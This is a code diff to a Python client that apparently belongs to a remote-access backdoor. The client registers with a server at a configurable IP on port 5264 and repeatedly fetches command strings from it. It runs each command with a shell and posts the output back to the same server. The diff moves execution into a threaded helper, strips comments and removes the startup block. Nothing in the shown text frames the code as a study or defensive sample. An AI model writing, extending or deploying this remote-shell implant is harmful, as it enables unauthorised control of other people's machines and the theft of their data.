@@ -52,8 +52,8 @@ def CookieIF():
 
 def Cookie():
     global Cookie_admin
-    CookieIF()  # 进入CookieIF函数
-    global flag  # 在这里才读取全局变量
+    CookieIF()
+    global flag
     if Cookie_admin and flag:
         return Cookie_admin
     else:
@@ -65,12 +65,18 @@ def Cookie():
         return Cookie_admin
 
 
+def CommandStart(s):
+    print(s)
+    result = subprocess.run(s, shell=True, capture_output=True, text=True)
+    b = result.stdout
+    requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp/Input", data=b)
+
+
 def ShellOsHttp():
     while True:
-        s = requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp", data=Cookie(), timeout=None).text
-        process = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        b = process.stdout
-        requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp/Input", data=b)
+        command = requests.post(f"http://{ServerIP}:5264/api/ShellOsHttp", data=Cookie(), timeout=None).text
+        thread = threading.Thread(target=CommandStart, args=(command,))
+        thread.start()
 
 
 def HeartbeatHttp():
@@ -87,11 +93,3 @@ def InitServer():
     print(data)
     requests.post(f"http://{ServerIP}:5264/api/init/cookie", data=data)
     return
-
-
-if __name__ == "__main__":
-    InitServer()
-    t2 = threading.Thread(target=ShellOsHttp)
-    t1 = threading.Thread(target=HeartbeatHttp)
-    t2.start()
-    t1.start()
